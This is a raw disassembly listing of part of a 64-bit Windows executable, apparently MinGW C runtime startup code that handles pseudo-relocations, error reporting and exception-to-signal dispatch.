   14000172c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001730:	48 8d 1d 31 3a 00 00 	lea    0x3a31(%rip),%rbx        # 0x140005168
   140001737:	e9 53 ff ff ff       	jmp    0x14000168f
   14000173c:	48 8d 1d 83 3a 00 00 	lea    0x3a83(%rip),%rbx        # 0x1400051c6
   140001743:	e9 47 ff ff ff       	jmp    0x14000168f
   140001748:	90                   	nop
   140001749:	90                   	nop
   14000174a:	90                   	nop
   14000174b:	90                   	nop
   14000174c:	90                   	nop
   14000174d:	90                   	nop
   14000174e:	90                   	nop
   14000174f:	90                   	nop
   140001750:	db e3                	fninit
   140001752:	c3                   	ret
   140001753:	90                   	nop
   140001754:	90                   	nop
   140001755:	90                   	nop
   140001756:	90                   	nop
   140001757:	90                   	nop
   140001758:	90                   	nop
   140001759:	90                   	nop
   14000175a:	90                   	nop
   14000175b:	90                   	nop
   14000175c:	90                   	nop
   14000175d:	90                   	nop
   14000175e:	90                   	nop
   14000175f:	90                   	nop
   140001760:	55                   	push   %rbp
   140001761:	56                   	push   %rsi
   140001762:	53                   	push   %rbx
   140001763:	48 83 ec 30          	sub    $0x30,%rsp
   140001767:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   14000176c:	48 89 cb             	mov    %rcx,%rbx
   14000176f:	48 8d 45 28          	lea    0x28(%rbp),%rax
   140001773:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001778:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   14000177c:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   140001780:	4c 89 4d 38          	mov    %r9,0x38(%rbp)
   140001784:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140001788:	e8 53 0e 00 00       	call   0x1400025e0
   14000178d:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
   140001793:	ba 01 00 00 00       	mov    $0x1,%edx
   140001798:	48 8d 0d 81 3a 00 00 	lea    0x3a81(%rip),%rcx        # 0x140005220
   14000179f:	49 89 c1             	mov    %rax,%r9
   1400017a2:	e8 e1 0e 00 00       	call   0x140002688
   1400017a7:	48 8b 75 f8          	mov    -0x8(%rbp),%rsi
   1400017ab:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400017b0:	e8 2b 0e 00 00       	call   0x1400025e0
   1400017b5:	48 89 da             	mov    %rbx,%rdx
   1400017b8:	48 89 c1             	mov    %rax,%rcx
   1400017bb:	49 89 f0             	mov    %rsi,%r8
   1400017be:	e8 f5 0e 00 00       	call   0x1400026b8
   1400017c3:	e8 98 0e 00 00       	call   0x140002660
   1400017c8:	90                   	nop
   1400017c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400017d0:	55                   	push   %rbp
   1400017d1:	57                   	push   %rdi
   1400017d2:	56                   	push   %rsi
   1400017d3:	53                   	push   %rbx
   1400017d4:	48 83 ec 58          	sub    $0x58,%rsp
   1400017d8:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   1400017dd:	48 63 35 c0 68 00 00 	movslq 0x68c0(%rip),%rsi        # 0x1400080a4
   1400017e4:	48 89 cb             	mov    %rcx,%rbx
   1400017e7:	85 f6                	test   %esi,%esi
   1400017e9:	0f 8e 11 01 00 00    	jle    0x140001900
   1400017ef:	48 8b 05 b2 68 00 00 	mov    0x68b2(%rip),%rax        # 0x1400080a8
   1400017f6:	45 31 c9             	xor    %r9d,%r9d
   1400017f9:	48 83 c0 18          	add    $0x18,%rax
   1400017fd:	0f 1f 00             	nopl   (%rax)
   140001800:	4c 8b 00             	mov    (%rax),%r8
   140001803:	4c 39 c3             	cmp    %r8,%rbx
   140001806:	72 13                	jb     0x14000181b
   140001808:	48 8b 50 08          	mov    0x8(%rax),%rdx
   14000180c:	8b 52 08             	mov    0x8(%rdx),%edx
   14000180f:	49 01 d0             	add    %rdx,%r8
   140001812:	4c 39 c3             	cmp    %r8,%rbx
   140001815:	0f 82 88 00 00 00    	jb     0x1400018a3
   14000181b:	41 83 c1 01          	add    $0x1,%r9d
   14000181f:	48 83 c0 28          	add    $0x28,%rax
   140001823:	41 39 f1             	cmp    %esi,%r9d
   140001826:	75 d8                	jne    0x140001800
   140001828:	48 89 d9             	mov    %rbx,%rcx
   14000182b:	e8 50 0a 00 00       	call   0x140002280
   140001830:	48 89 c7             	mov    %rax,%rdi
   140001833:	48 85 c0             	test   %rax,%rax
   140001836:	0f 84 e6 00 00 00    	je     0x140001922
   14000183c:	48 8b 05 65 68 00 00 	mov    0x6865(%rip),%rax        # 0x1400080a8
   140001843:	48 8d 1c b6          	lea    (%rsi,%rsi,4),%rbx
   140001847:	48 c1 e3 03          	shl    $0x3,%rbx
   14000184b:	48 01 d8             	add    %rbx,%rax
   14000184e:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140001852:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001858:	e8 63 0b 00 00       	call   0x1400023c0
   14000185d:	8b 57 0c             	mov    0xc(%rdi),%edx
   140001860:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   140001866:	48 8d 0c 10          	lea    (%rax,%rdx,1),%rcx
   14000186a:	48 8b 05 37 68 00 00 	mov    0x6837(%rip),%rax        # 0x1400080a8
   140001871:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   140001875:	48 89 4c 18 18       	mov    %rcx,0x18(%rax,%rbx,1)
   14000187a:	ff 15 f8 7a 00 00    	call   *0x7af8(%rip)        # 0x140009378
   140001880:	48 85 c0             	test   %rax,%rax
   140001883:	0f 84 7e 00 00 00    	je     0x140001907
   140001889:	8b 45 f4             	mov    -0xc(%rbp),%eax
   14000188c:	8d 50 fc             	lea    -0x4(%rax),%edx
   14000188f:	83 e2 fb             	and    $0xfffffffb,%edx
   140001892:	74 08                	je     0x14000189c
   140001894:	8d 50 c0             	lea    -0x40(%rax),%edx
   140001897:	83 e2 bf             	and    $0xffffffbf,%edx
   14000189a:	75 14                	jne    0x1400018b0
   14000189c:	83 05 01 68 00 00 01 	addl   $0x1,0x6801(%rip)        # 0x1400080a4
   1400018a3:	48 83 c4 58          	add    $0x58,%rsp
   1400018a7:	5b                   	pop    %rbx
   1400018a8:	5e                   	pop    %rsi
   1400018a9:	5f                   	pop    %rdi
   1400018aa:	5d                   	pop    %rbp
   1400018ab:	c3                   	ret
   1400018ac:	0f 1f 40 00          	nopl   0x0(%rax)
   1400018b0:	83 f8 02             	cmp    $0x2,%eax
   1400018b3:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   1400018b7:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   1400018bb:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   1400018c1:	b8 04 00 00 00       	mov    $0x4,%eax
   1400018c6:	44 0f 44 c0          	cmove  %eax,%r8d
   1400018ca:	48 03 1d d7 67 00 00 	add    0x67d7(%rip),%rbx        # 0x1400080a8
   1400018d1:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   1400018d5:	49 89 d9             	mov    %rbx,%r9
   1400018d8:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   1400018dc:	ff 15 8e 7a 00 00    	call   *0x7a8e(%rip)        # 0x140009370
   1400018e2:	85 c0                	test   %eax,%eax
   1400018e4:	75 b6                	jne    0x14000189c
   1400018e6:	ff 15 fc 79 00 00    	call   *0x79fc(%rip)        # 0x1400092e8
   1400018ec:	48 8d 0d a5 39 00 00 	lea    0x39a5(%rip),%rcx        # 0x140005298
   1400018f3:	89 c2                	mov    %eax,%edx
   1400018f5:	e8 66 fe ff ff       	call   0x140001760
   1400018fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001900:	31 f6                	xor    %esi,%esi
   140001902:	e9 21 ff ff ff       	jmp    0x140001828
   140001907:	48 8b 05 9a 67 00 00 	mov    0x679a(%rip),%rax        # 0x1400080a8
   14000190e:	8b 57 08             	mov    0x8(%rdi),%edx
   140001911:	48 8d 0d 48 39 00 00 	lea    0x3948(%rip),%rcx        # 0x140005260
   140001918:	4c 8b 44 18 18       	mov    0x18(%rax,%rbx,1),%r8
   14000191d:	e8 3e fe ff ff       	call   0x140001760
   140001922:	48 89 da             	mov    %rbx,%rdx
   140001925:	48 8d 0d 14 39 00 00 	lea    0x3914(%rip),%rcx        # 0x140005240
   14000192c:	e8 2f fe ff ff       	call   0x140001760
   140001931:	90                   	nop
   140001932:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001939:	00 00 00 00 
   14000193d:	0f 1f 00             	nopl   (%rax)
   140001940:	55                   	push   %rbp
   140001941:	41 57                	push   %r15
   140001943:	41 56                	push   %r14
   140001945:	41 55                	push   %r13
   140001947:	41 54                	push   %r12
   140001949:	57                   	push   %rdi
   14000194a:	56                   	push   %rsi
   14000194b:	53                   	push   %rbx
   14000194c:	48 83 ec 48          	sub    $0x48,%rsp
   140001950:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140001955:	44 8b 25 44 67 00 00 	mov    0x6744(%rip),%r12d        # 0x1400080a0
   14000195c:	45 85 e4             	test   %r12d,%r12d
   14000195f:	74 17                	je     0x140001978
   140001961:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   140001965:	5b                   	pop    %rbx
   140001966:	5e                   	pop    %rsi
   140001967:	5f                   	pop    %rdi
   140001968:	41 5c                	pop    %r12
   14000196a:	41 5d                	pop    %r13
   14000196c:	41 5e                	pop    %r14
   14000196e:	41 5f                	pop    %r15
   140001970:	5d                   	pop    %rbp
   140001971:	c3                   	ret
   140001972:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001978:	c7 05 1e 67 00 00 01 	movl   $0x1,0x671e(%rip)        # 0x1400080a0
   14000197f:	00 00 00 
   140001982:	e8 79 09 00 00       	call   0x140002300
   140001987:	48 98                	cltq
   140001989:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   14000198d:	48 8d 04 c5 0f 00 00 	lea    0xf(,%rax,8),%rax
   140001994:	00 
   140001995:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140001999:	e8 b2 0b 00 00       	call   0x140002550
   14000199e:	4c 8b 2d 3b 3a 00 00 	mov    0x3a3b(%rip),%r13        # 0x1400053e0
   1400019a5:	48 8b 1d 44 3a 00 00 	mov    0x3a44(%rip),%rbx        # 0x1400053f0
   1400019ac:	c7 05 ee 66 00 00 00 	movl   $0x0,0x66ee(%rip)        # 0x1400080a4
   1400019b3:	00 00 00 
   1400019b6:	48 29 c4             	sub    %rax,%rsp
   1400019b9:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400019be:	48 89 05 e3 66 00 00 	mov    %rax,0x66e3(%rip)        # 0x1400080a8
   1400019c5:	4c 89 e8             	mov    %r13,%rax
   1400019c8:	48 29 d8             	sub    %rbx,%rax
   1400019cb:	48 83 f8 07          	cmp    $0x7,%rax
   1400019cf:	7e 90                	jle    0x140001961
   1400019d1:	8b 13                	mov    (%rbx),%edx
   1400019d3:	48 83 f8 0b          	cmp    $0xb,%rax
   1400019d7:	0f 8f 03 01 00 00    	jg     0x140001ae0
   1400019dd:	8b 03                	mov    (%rbx),%eax
   1400019df:	85 c0                	test   %eax,%eax
   1400019e1:	0f 85 69 02 00 00    	jne    0x140001c50
   1400019e7:	8b 43 04             	mov    0x4(%rbx),%eax
   1400019ea:	85 c0                	test   %eax,%eax
   1400019ec:	0f 85 5e 02 00 00    	jne    0x140001c50
   1400019f2:	8b 53 08             	mov    0x8(%rbx),%edx
   1400019f5:	83 fa 01             	cmp    $0x1,%edx
   1400019f8:	0f 85 92 02 00 00    	jne    0x140001c90
   1400019fe:	48 83 c3 0c          	add    $0xc,%rbx
   140001a02:	4c 39 eb             	cmp    %r13,%rbx
   140001a05:	0f 83 56 ff ff ff    	jae    0x140001961
   140001a0b:	4c 8b 35 fe 39 00 00 	mov    0x39fe(%rip),%r14        # 0x140005410
   140001a12:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   140001a18:	eb 65                	jmp    0x140001a7f
   140001a1a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001a20:	83 f9 08             	cmp    $0x8,%ecx
   140001a23:	0f 84 d7 00 00 00    	je     0x140001b00
   140001a29:	83 f9 10             	cmp    $0x10,%ecx
   140001a2c:	0f 85 50 02 00 00    	jne    0x140001c82
   140001a32:	0f b7 37             	movzwl (%rdi),%esi
   140001a35:	81 e2 c0 00 00 00    	and    $0xc0,%edx
   140001a3b:	66 85 f6             	test   %si,%si
   140001a3e:	0f 89 cc 01 00 00    	jns    0x140001c10
   140001a44:	48 81 ce 00 00 ff ff 	or     $0xffffffffffff0000,%rsi
   140001a4b:	48 29 c6             	sub    %rax,%rsi
   140001a4e:	4c 01 ce             	add    %r9,%rsi
   140001a51:	85 d2                	test   %edx,%edx
   140001a53:	75 12                	jne    0x140001a67
   140001a55:	48 81 fe 00 80 ff ff 	cmp    $0xffffffffffff8000,%rsi
   140001a5c:	7c 65                	jl     0x140001ac3
   140001a5e:	48 81 fe ff ff 00 00 	cmp    $0xffff,%rsi
   140001a65:	7f 5c                	jg     0x140001ac3
   140001a67:	48 89 f9             	mov    %rdi,%rcx
   140001a6a:	e8 61 fd ff ff       	call   0x1400017d0
   140001a6f:	66 89 37             	mov    %si,(%rdi)
   140001a72:	48 83 c3 0c          	add    $0xc,%rbx
   140001a76:	4c 39 eb             	cmp    %r13,%rbx
   140001a79:	0f 83 d1 00 00 00    	jae    0x140001b50
   140001a7f:	8b 03                	mov    (%rbx),%eax
   140001a81:	8b 53 08             	mov    0x8(%rbx),%edx
   140001a84:	8b 7b 04             	mov    0x4(%rbx),%edi
   140001a87:	4c 01 f0             	add    %r14,%rax
   140001a8a:	0f b6 ca             	movzbl %dl,%ecx
   140001a8d:	4c 8b 08             	mov    (%rax),%r9
   140001a90:	4c 01 f7             	add    %r14,%rdi
   140001a93:	83 f9 20             	cmp    $0x20,%ecx
   140001a96:	0f 84 0c 01 00 00    	je     0x140001ba8
   140001a9c:	76 82                	jbe    0x140001a20
   140001a9e:	83 f9 40             	cmp    $0x40,%ecx
   140001aa1:	0f 85 db 01 00 00    	jne    0x140001c82
   140001aa7:	48 8b 37             	mov    (%rdi),%rsi
   140001aaa:	89 d1                	mov    %edx,%ecx
   140001aac:	48 29 c6             	sub    %rax,%rsi
   140001aaf:	4c 01 ce             	add    %r9,%rsi
   140001ab2:	81 e1 c0 00 00 00    	and    $0xc0,%ecx
   140001ab8:	0f 85 42 01 00 00    	jne    0x140001c00
   140001abe:	48 85 f6             	test   %rsi,%rsi
   140001ac1:	78 af                	js     0x140001a72
   140001ac3:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001ac8:	89 ca                	mov    %ecx,%edx
   140001aca:	49 89 f8             	mov    %rdi,%r8
   140001acd:	48 8d 0d 54 38 00 00 	lea    0x3854(%rip),%rcx        # 0x140005328
   140001ad4:	e8 87 fc ff ff       	call   0x140001760
   140001ad9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001ae0:	85 d2                	test   %edx,%edx
   140001ae2:	0f 85 68 01 00 00    	jne    0x140001c50
   140001ae8:	8b 43 04             	mov    0x4(%rbx),%eax
   140001aeb:	89 c2                	mov    %eax,%edx
   140001aed:	0b 53 08             	or     0x8(%rbx),%edx
   140001af0:	0f 85 f4 fe ff ff    	jne    0x1400019ea
   140001af6:	48 83 c3 0c          	add    $0xc,%rbx
   140001afa:	e9 de fe ff ff       	jmp    0x1400019dd
   140001aff:	90                   	nop
   140001b00:	0f b6 37             	movzbl (%rdi),%esi
   140001b03:	81 e2 c0 00 00 00    	and    $0xc0,%edx
   140001b09:	40 84 f6             	test   %sil,%sil
   140001b0c:	0f 89 26 01 00 00    	jns    0x140001c38
   140001b12:	48 81 ce 00 ff ff ff 	or     $0xffffffffffffff00,%rsi
   140001b19:	48 29 c6             	sub    %rax,%rsi
   140001b1c:	4c 01 ce             	add    %r9,%rsi
   140001b1f:	85 d2                	test   %edx,%edx
   140001b21:	75 0f                	jne    0x140001b32
   140001b23:	48 81 fe ff 00 00 00 	cmp    $0xff,%rsi
   140001b2a:	7f 97                	jg     0x140001ac3
   140001b2c:	48 83 fe 80          	cmp    $0xffffffffffffff80,%rsi
   140001b30:	7c 91                	jl     0x140001ac3
   140001b32:	48 89 f9             	mov    %rdi,%rcx
   140001b35:	48 83 c3 0c          	add    $0xc,%rbx
   140001b39:	e8 92 fc ff ff       	call   0x1400017d0
   140001b3e:	40 88 37             	mov    %sil,(%rdi)
   140001b41:	4c 39 eb             	cmp    %r13,%rbx
   140001b44:	0f 82 35 ff ff ff    	jb     0x140001a7f
   140001b4a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001b50:	8b 15 4e 65 00 00    	mov    0x654e(%rip),%edx        # 0x1400080a4
   140001b56:	85 d2                	test   %edx,%edx
   140001b58:	0f 8e 03 fe ff ff    	jle    0x140001961
   140001b5e:	48 8b 35 0b 78 00 00 	mov    0x780b(%rip),%rsi        # 0x140009370
   140001b65:	31 db                	xor    %ebx,%ebx
   140001b67:	48 8d 7d fc          	lea    -0x4(%rbp),%rdi
   140001b6b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001b70:	48 8b 05 31 65 00 00 	mov    0x6531(%rip),%rax        # 0x1400080a8
   140001b77:	48 01 d8             	add    %rbx,%rax
   140001b7a:	44 8b 00             	mov    (%rax),%r8d
   140001b7d:	45 85 c0             	test   %r8d,%r8d
   140001b80:	74 0d                	je     0x140001b8f
   140001b82:	48 8b 50 10          	mov    0x10(%rax),%rdx
   140001b86:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140001b8a:	49 89 f9             	mov    %rdi,%r9
   140001b8d:	ff d6                	call   *%rsi
   140001b8f:	41 83 c4 01          	add    $0x1,%r12d
   140001b93:	48 83 c3 28          	add    $0x28,%rbx
   140001b97:	44 3b 25 06 65 00 00 	cmp    0x6506(%rip),%r12d        # 0x1400080a4
   140001b9e:	7c d0                	jl     0x140001b70
   140001ba0:	e9 bc fd ff ff       	jmp    0x140001961
   140001ba5:	0f 1f 00             	nopl   (%rax)
   140001ba8:	8b 37                	mov    (%rdi),%esi
   140001baa:	81 e2 c0 00 00 00    	and    $0xc0,%edx
   140001bb0:	85 f6                	test   %esi,%esi
   140001bb2:	79 74                	jns    0x140001c28
   140001bb4:	49 bb 00 00 00 00 ff 	movabs $0xffffffff00000000,%r11
   140001bbb:	ff ff ff 
   140001bbe:	4c 09 de             	or     %r11,%rsi
   140001bc1:	48 29 c6             	sub    %rax,%rsi
   140001bc4:	4c 01 ce             	add    %r9,%rsi
   140001bc7:	85 d2                	test   %edx,%edx
   140001bc9:	75 1c                	jne    0x140001be7
   140001bcb:	4c 39 fe             	cmp    %r15,%rsi
   140001bce:	0f 8f ef fe ff ff    	jg     0x140001ac3
   140001bd4:	48 b8 ff ff ff 7f ff 	movabs $0xffffffff7fffffff,%rax
   140001bdb:	ff ff ff 
   140001bde:	48 39 c6             	cmp    %rax,%rsi
   140001be1:	0f 8e dc fe ff ff    	jle    0x140001ac3
   140001be7:	48 89 f9             	mov    %rdi,%rcx
   140001bea:	e8 e1 fb ff ff       	call   0x1400017d0
   140001bef:	89 37                	mov    %esi,(%rdi)
   140001bf1:	e9 7c fe ff ff       	jmp    0x140001a72
   140001bf6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001bfd:	00 00 00 
   140001c00:	48 89 f9             	mov    %rdi,%rcx
   140001c03:	e8 c8 fb ff ff       	call   0x1400017d0
   140001c08:	48 89 37             	mov    %rsi,(%rdi)
   140001c0b:	e9 62 fe ff ff       	jmp    0x140001a72
   140001c10:	48 29 c6             	sub    %rax,%rsi
   140001c13:	4c 01 ce             	add    %r9,%rsi
   140001c16:	85 d2                	test   %edx,%edx
   140001c18:	0f 84 37 fe ff ff    	je     0x140001a55
   140001c1e:	e9 44 fe ff ff       	jmp    0x140001a67
   140001c23:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001c28:	48 29 c6             	sub    %rax,%rsi
   140001c2b:	4c 01 ce             	add    %r9,%rsi
   140001c2e:	85 d2                	test   %edx,%edx
   140001c30:	74 99                	je     0x140001bcb
   140001c32:	eb b3                	jmp    0x140001be7
   140001c34:	0f 1f 40 00          	nopl   0x0(%rax)
   140001c38:	48 29 c6             	sub    %rax,%rsi
   140001c3b:	4c 01 ce             	add    %r9,%rsi
   140001c3e:	85 d2                	test   %edx,%edx
   140001c40:	0f 84 dd fe ff ff    	je     0x140001b23
   140001c46:	e9 e7 fe ff ff       	jmp    0x140001b32
   140001c4b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001c50:	4c 39 eb             	cmp    %r13,%rbx
   140001c53:	0f 83 08 fd ff ff    	jae    0x140001961
   140001c59:	4c 8b 35 b0 37 00 00 	mov    0x37b0(%rip),%r14        # 0x140005410
   140001c60:	8b 73 04             	mov    0x4(%rbx),%esi
   140001c63:	8b 3b                	mov    (%rbx),%edi
   140001c65:	48 83 c3 08          	add    $0x8,%rbx
   140001c69:	4c 01 f6             	add    %r14,%rsi
   140001c6c:	03 3e                	add    (%rsi),%edi
   140001c6e:	48 89 f1             	mov    %rsi,%rcx
   140001c71:	e8 5a fb ff ff       	call   0x1400017d0
   140001c76:	89 3e                	mov    %edi,(%rsi)
   140001c78:	4c 39 eb             	cmp    %r13,%rbx
   140001c7b:	72 e3                	jb     0x140001c60
   140001c7d:	e9 ce fe ff ff       	jmp    0x140001b50
   140001c82:	89 ca                	mov    %ecx,%edx
   140001c84:	48 8d 0d 6d 36 00 00 	lea    0x366d(%rip),%rcx        # 0x1400052f8
   140001c8b:	e8 d0 fa ff ff       	call   0x140001760
   140001c90:	48 8d 0d 29 36 00 00 	lea    0x3629(%rip),%rcx        # 0x1400052c0
   140001c97:	e8 c4 fa ff ff       	call   0x140001760
   140001c9c:	90                   	nop
   140001c9d:	90                   	nop
   140001c9e:	90                   	nop
   140001c9f:	90                   	nop
   140001ca0:	55                   	push   %rbp
   140001ca1:	48 89 e5             	mov    %rsp,%rbp
   140001ca4:	48 83 ec 50          	sub    $0x50,%rsp
   140001ca8:	48 8b 05 01 64 00 00 	mov    0x6401(%rip),%rax        # 0x1400080b0
   140001caf:	66 0f 14 d3          	unpcklpd %xmm3,%xmm2
   140001cb3:	48 85 c0             	test   %rax,%rax
   140001cb6:	74 1c                	je     0x140001cd4
   140001cb8:	f2 0f 10 45 30       	movsd  0x30(%rbp),%xmm0
   140001cbd:	89 4d d0             	mov    %ecx,-0x30(%rbp)
   140001cc0:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140001cc4:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   140001cc8:	0f 11 55 e0          	movups %xmm2,-0x20(%rbp)
   140001ccc:	f2 0f 11 45 f0       	movsd  %xmm0,-0x10(%rbp)
   140001cd1:	ff d0                	call   *%rax
   140001cd3:	90                   	nop
   140001cd4:	48 83 c4 50          	add    $0x50,%rsp
   140001cd8:	5d                   	pop    %rbp
   140001cd9:	c3                   	ret
   140001cda:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001ce0:	48 89 0d c9 63 00 00 	mov    %rcx,0x63c9(%rip)        # 0x1400080b0
   140001ce7:	e9 44 09 00 00       	jmp    0x140002630
   140001cec:	90                   	nop
   140001ced:	90                   	nop
   140001cee:	90                   	nop
   140001cef:	90                   	nop
   140001cf0:	55                   	push   %rbp
   140001cf1:	53                   	push   %rbx
   140001cf2:	48 83 ec 28          	sub    $0x28,%rsp
   140001cf6:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140001cfb:	48 8b 11             	mov    (%rcx),%rdx
   140001cfe:	8b 02                	mov    (%rdx),%eax
   140001d00:	48 89 cb             	mov    %rcx,%rbx
   140001d03:	89 c1                	mov    %eax,%ecx
   140001d05:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
   140001d0b:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
   140001d11:	0f 84 b9 00 00 00    	je     0x140001dd0
   140001d17:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
   140001d1c:	77 49                	ja     0x140001d67
   140001d1e:	3d 8b 00 00 c0       	cmp    $0xc000008b,%eax
   140001d23:	76 5b                	jbe    0x140001d80
   140001d25:	05 73 ff ff 3f       	add    $0x3fffff73,%eax
   140001d2a:	83 f8 09             	cmp    $0x9,%eax
   140001d2d:	0f 87 8d 00 00 00    	ja     0x140001dc0
   140001d33:	48 8d 15 46 36 00 00 	lea    0x3646(%rip),%rdx        # 0x140005380
   140001d3a:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140001d3e:	48 01 d0             	add    %rdx,%rax
   140001d41:	ff e0                	jmp    *%rax
   140001d43:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001d48:	31 d2                	xor    %edx,%edx
   140001d4a:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001d4f:	e8 4c 09 00 00       	call   0x1400026a0
   140001d54:	48 83 f8 01          	cmp    $0x1,%rax
   140001d58:	0f 84 36 01 00 00    	je     0x140001e94
   140001d5e:	48 85 c0             	test   %rax,%rax
   140001d61:	0f 85 f9 00 00 00    	jne    0x140001e60
   140001d67:	48 8b 05 62 63 00 00 	mov    0x6362(%rip),%rax        # 0x1400080d0
   140001d6e:	48 85 c0             	test   %rax,%rax
   140001d71:	74 6d                	je     0x140001de0
   140001d73:	48 89 d9             	mov    %rbx,%rcx
   140001d76:	48 83 c4 28          	add    $0x28,%rsp
   140001d7a:	5b                   	pop    %rbx
   140001d7b:	5d                   	pop    %rbp
   140001d7c:	48 ff e0             	rex.W jmp *%rax
   140001d7f:	90                   	nop
   140001d80:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
   140001d85:	0f 84 a5 00 00 00    	je     0x140001e30
   140001d8b:	76 63                	jbe    0x140001df0
   140001d8d:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
   140001d92:	74 2c                	je     0x140001dc0
   140001d94:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
   140001d99:	75 cc                	jne    0x140001d67
   140001d9b:	31 d2                	xor    %edx,%edx
   140001d9d:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001da2:	e8 f9 08 00 00       	call   0x1400026a0
   140001da7:	48 83 f8 01          	cmp    $0x1,%rax
   140001dab:	0f 84 cf 00 00 00    	je     0x140001e80
   140001db1:	48 85 c0             	test   %rax,%rax
   140001db4:	74 b1                	je     0x140001d67
   140001db6:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001dbb:	ff d0                	call   *%rax
   140001dbd:	0f 1f 00             	nopl   (%rax)
   140001dc0:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001dc5:	eb 1b                	jmp    0x140001de2
   140001dc7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001dce:	00 00 
   140001dd0:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
   140001dd4:	0f 85 3d ff ff ff    	jne    0x140001d17
   140001dda:	eb e4                	jmp    0x140001dc0
   140001ddc:	0f 1f 40 00          	nopl   0x0(%rax)
   140001de0:	31 c0                	xor    %eax,%eax
   140001de2:	48 83 c4 28          	add    $0x28,%rsp
   140001de6:	5b                   	pop    %rbx
   140001de7:	5d                   	pop    %rbp
   140001de8:	c3                   	ret
   140001de9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001df0:	3d 02 00 00 80       	cmp    $0x80000002,%eax
   140001df5:	0f 85 6c ff ff ff    	jne    0x140001d67
   140001dfb:	eb c3                	jmp    0x140001dc0
   140001dfd:	0f 1f 00             	nopl   (%rax)
   140001e00:	31 d2                	xor    %edx,%edx
   140001e02:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001e07:	e8 94 08 00 00       	call   0x1400026a0
   140001e0c:	48 83 f8 01          	cmp    $0x1,%rax
   140001e10:	0f 85 48 ff ff ff    	jne    0x140001d5e
   140001e16:	ba 01 00 00 00       	mov    $0x1,%edx
   140001e1b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001e20:	e8 7b 08 00 00       	call   0x1400026a0
   140001e25:	eb 99                	jmp    0x140001dc0
   140001e27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001e2e:	00 00 
   140001e30:	31 d2                	xor    %edx,%edx
   140001e32:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001e37:	e8 64 08 00 00       	call   0x1400026a0
   140001e3c:	48 83 f8 01          	cmp    $0x1,%rax
   140001e40:	74 2a                	je     0x140001e6c
   140001e42:	48 85 c0             	test   %rax,%rax
   140001e45:	0f 84 1c ff ff ff    	je     0x140001d67
   140001e4b:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001e50:	ff d0                	call   *%rax
   140001e52:	e9 69 ff ff ff       	jmp    0x140001dc0
   140001e57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001e5e:	00 00 
   140001e60:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001e65:	ff d0                	call   *%rax
   140001e67:	e9 54 ff ff ff       	jmp    0x140001dc0
   140001e6c:	ba 01 00 00 00       	mov    $0x1,%edx
   140001e71:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001e76:	e8 25 08 00 00       	call   0x1400026a0
   140001e7b:	e9 40 ff ff ff       	jmp    0x140001dc0
   140001e80:	ba 01 00 00 00       	mov    $0x1,%edx
   140001e85:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001e8a:	e8 11 08 00 00       	call   0x1400026a0
